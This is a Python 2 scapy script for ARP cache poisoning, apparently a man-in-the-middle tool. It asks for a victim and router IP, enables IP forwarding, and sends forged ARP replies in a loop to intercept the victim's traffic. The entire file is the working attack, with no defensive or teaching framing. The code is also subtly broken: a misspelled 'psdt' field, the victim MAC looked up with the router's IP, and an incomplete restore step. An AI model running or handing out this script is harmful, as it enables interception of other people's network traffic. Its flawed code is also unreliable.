from scapy.all import *
import sys
import os
import time

try:
	interface = raw_input("[*] Interface: ")
	vIP = raw_input("[*] Victim IP: ")
	gIP = raw_input("[*] Router IP: ")
except KeyboardInterrupt:
	print "\n[*] Shutting Down..."
	sys.exit(1)

print "\nEnabling IP Forwarding...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout=2, iface = interface, inter = 0.1)
	for snd, rcv in ans:
		return rcv.sprint(r"%Ether.src%")

def reARP():
	
	print "\n[*] Restoring Targets..."
	vMAC = get_mac(vIP)
	gMAC = get_mac(gIP)
	send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gMAC), count = 7)
	print "[*] Disabling IP Forwarding..."
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print "[*] Shutting Down..."
	sys.exit(1)

def trick(gm, vm):
	send(ARP(op = 2, psdt = vIP, psrc = gIP, hwdst= vm))
	send(ARP(op = 2, pdst = gIP, psrc = vIP, hwdst= gm))

def mitm():
	try:
		vMAC = get_mac(gIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[-] Couldn't Find Victim MAC Address!!"
		print "[-] Shutting Down..."
		sys.exit(1)
	try:
		gMAC = get_mac(gIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		print "[-] Couldn't Find Gateway MAC Address!!"
		print "[-] Shutting Down..."
		sys.exit(1)
	print "[*] Poisoning Targets..."
	while 1:
		try:
			trick(gMAC, vMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reARP()
			break

mitm()

